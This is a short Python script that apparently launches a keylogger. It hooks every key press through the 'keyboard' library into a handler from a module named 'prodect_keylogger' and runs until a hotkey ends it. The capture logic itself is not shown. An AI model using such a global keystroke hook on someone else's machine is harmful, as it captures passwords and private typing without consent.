import keyboard
import prodect_keylogger as pk

keyboard.on_press(pk.on_key_press)
keyboard.wait('Ctrl + Shift + .')